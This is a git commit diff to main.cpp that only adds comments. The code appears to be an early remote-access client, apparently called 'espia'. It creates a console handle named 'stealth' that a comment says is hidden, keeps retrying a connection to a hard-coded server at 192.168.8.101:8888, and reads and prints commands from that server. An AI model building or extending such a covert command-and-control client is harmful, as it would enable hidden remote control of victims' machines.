9538c77e67b5e5e1070413679f0ef5dce94b720a
Indrajith Madhumal <indrajithmadhumal@gmail.com>
2022-04-12 17:03:23 +0530

    Added some comments

--- main.cpp
+++ main.cpp
@@ -9,16 +9,23 @@
 #define TRY_SERVER 5
 
 int main() {
-	HWND stealth;           //Declare a window handle 
-	AllocConsole();			//Allocate a new console
-	stealth = FindWindowA("ConsoleWindowClass", NULL); //Find the previous Window handler and hide/show the window depending upon the next command
+    /* Allocate a new console and hide it (SW_HIDE) */
+	HWND stealth;           
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(stealth, SW_NORMAL);
+    /* ------------------------------------------- */
 
+
+    /* Keep trying to connect to the server */
 	WORD server_status;
 	SOCKET connection;
 	while ((server_status = espia_connect("192.168.8.101", "8888", &connection)) == CONNECTION_FAIL)
 		Sleep(TRY_SERVER);
+    /* ------------------------------------ */
 
+
+    /* Main flow of the program, command recieving, parsing */
     CHAR buff[256];
     int cmd_size;
     while (strcmp(buff, "exit")) {
@@ -27,8 +34,12 @@ int main() {
         memset(buff + cmd_size - 1, 0, 1);
         printf("Server>> %s | Size (%d)\n", buff, cmd_size);
     }
+    /* ---------------------------------------------------- */
 
+
+    /* Disconnecting from the server */
 	espia_disconnect(&connection);
+    /* ----------------------------- */
 
 	return 0;
 }
